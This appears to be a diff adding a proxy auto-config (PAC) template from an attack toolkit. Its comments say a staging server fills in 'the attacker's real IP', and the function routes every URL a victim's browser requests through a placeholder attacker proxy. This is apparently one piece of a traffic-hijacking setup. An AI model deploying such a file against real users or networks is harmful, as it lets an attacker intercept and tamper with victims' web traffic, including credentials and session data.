@@ -1,0 +1,5 @@
+// This file is served dynamically by stage/http.py with the attacker's real IP.
+// The template below is for reference only.
+function FindProxyForURL(url, host) {
+  return "PROXY <attacker-ip>:<proxy-port>";
+}
